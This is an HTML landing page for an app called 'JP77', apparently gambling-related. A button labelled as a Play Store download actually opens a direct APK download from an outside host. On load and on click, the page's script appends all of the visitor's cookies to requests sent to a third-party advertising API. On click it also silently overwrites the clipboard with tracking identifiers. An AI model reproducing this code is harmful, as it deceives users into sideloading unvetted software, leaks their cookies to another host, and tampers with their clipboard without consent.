<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>JP77</title>
    <link rel="icon" type="image/x-icon" href="" />
    <style>
      body {
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: black;
      }

      .container {
        position: relative;
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        height: 100%;
      }

      .BG {
        max-width: 100%;
        max-height: 100%;
        width: auto;
        height: auto;
      }

      .text {
        position: absolute;
        top: 27px;
        width: 6%;
      }

      .PLAYSTORE {
        position: absolute;
        top: 14%;
        width: 14%;
        cursor: pointer;
      }

      @keyframes pulse {
        0% {
          transform: scale(1);
        }
        50% {
          transform: scale(1.1);
        }
        100% {
          transform: scale(1);
        }
      }

      /* Responsive adjustments for mobile */
      @media (max-width: 768px) {
        .BG {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }
        .text {
          width: 22%;
          top: 5%;
        }
        .PLAYSTORE {
          top: 21%;
          width: 55%;
        }
      }

      /* Responsive adjustments for iPad (portrait & landscape) */
      @media (min-width: 769px) and (max-width: 1024px) {
        .BG {
          width: 100%;
          height: 100%;
          object-fit: contain;
        }
        .text {
          width: 18%;
          top: 4%;
        }
        .PLAYSTORE {
          top: 21%;
          width: 28%;
        }
      }

      /* Small tablet / 884 range (e.g., iPad Mini, narrow tablets) */
      @media (min-width: 768px) and (max-width: 884px) {
        .BG {
          width: 100%;
          height: 100%;
          object-fit: contain;
        }
        .text {
          width: 12%;
          top: 4%;
        }
        .PLAYSTORE {
          top: 21%;
          width: 28%;
        }
      }

      /* Responsive adjustments for iPad / medium tablets (portrait & landscape) */
      @media (min-width: 885px) and (max-width: 1180px) {
        .BG {
          width: 100%;
          height: 100%;
          object-fit: contain;
        }
        .text {
          width: 9%;
          top: 4%;
        }
        .PLAYSTORE {
          top: 21%;
          width: 20%;
        }
      }

      /* Laptop (Macbook Air 1280x800, common notebooks) */
      @media (min-width: 1181px) and (max-width: 1440px) {
        .container {
          width: 100vw;
          height: 100vh;
        }
        .BG {
          width: auto;
          height: 100%;
          object-fit: contain;
        }
        .text {
          width: 7%;
          top: 3.5%;
        }
        .PLAYSTORE {
          top: 21%;
          width: 16%;
        }
      }

      /* Large desktop */
      @media (min-width: 1441px) {
        .BG {
          width: auto;
          height: 100%;
          object-fit: contain;
        }
        .text {
          width: 5%;
          top: 27px;
        }
        .PLAYSTORE {
          width: 13%;
          margin-top: 60px;
        }
      }
    </style>
  </head>

  <body>
    <div class="container">
      <img class="BG" src="./JP77/BG.png" alt="Background" />
      <img class="text" src="./JP77/JP77.png" alt="JP77 Logo" />
      <img
        id="playstoreBtn"
        class="PLAYSTORE"
        src="./JP77/DOWNLAOD PLAYSTORE.gif"
        alt="Download from PlayStore"
      />
    </div>

    <script>
      document
        .getElementById("playstoreBtn")
        .addEventListener("click", function () {
          onClickBtn(); // Copy FIRST

          // Then open window after a small delay
          setTimeout(() => {
            window.open(
              "https://downloads.afbgaming.app/jp77.prod.1.17.apk"
            );
          }, 100);
        });

      // On page load - track show event
      window.onload = function () {
        var xhr = new XMLHttpRequest();
        xhr.open(
          "GET",
          getUrl("https://api.anubisriches.com/api/advertising/onshow"),
          true
        );
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4 && xhr.status === 200) {
            console.log("show");
          }
        };
        xhr.send();
      };

      function getUrl(url) {
        let requestUrl = url;
        if (window.location.search.length) {
          requestUrl +=
            window.location.search +
            "&" +
            document.cookie.replace("; ", "&").replace(";", "&");
        } else {
          requestUrl +=
            "?" + document.cookie.replace("; ", "&").replace(";", "&");
        }
        return requestUrl;
      }

      function onClickBtn() {
        // Track download event
        var xhr = new XMLHttpRequest();
        xhr.open(
          "GET",
          getUrl("https://api.anubisriches.com/api/advertising/ondownload"),
          true
        );
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4 && xhr.status === 200) {
            console.log("click");
          }
        };
        xhr.send();

        // Copy params to clipboard
        function getCookie(name) {
          var value = "; " + document.cookie;
          var parts = value.split("; " + name + "=");
          if (parts.length === 2) return parts.pop().split(";").shift();
          return null; // Return null if cookie not found
        }
        const { location } = window;
        var queryString = window.location.search;
        var params = {};
        if (queryString) {
          queryString = queryString.substring(1);
          var paramPairs = queryString.split("&");
          for (var i = 0; i < paramPairs.length; i++) {
            var pair = paramPairs[i].split("=");
            var key = decodeURIComponent(pair[0]);
            var value = decodeURIComponent(pair[1]);
            params[key] = value;
          }
        }

        var leadId = params["leadId"];
        if (leadId == null) {
          leadId = "";
        }
        var fbc = params["fbclid"];
        if (fbc == null) {
          fbc = "";
        }
        var fbp = getCookie("_fbp");
        if (fbp == null) {
          fbp = "";
        }

        var copyParam = {
          fbc: fbc,
          fbp: fbp,
          leadId: leadId,
          link: getUrl(location.origin + location.pathname),
        };
        var copyJsonString = JSON.stringify(copyParam);

        var textToCopy = copyJsonString;
        var textArea = document.createElement("textarea");
        textArea.value = textToCopy;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand("copy");
        document.body.removeChild(textArea);
      }
    </script>
  </body>
</html>
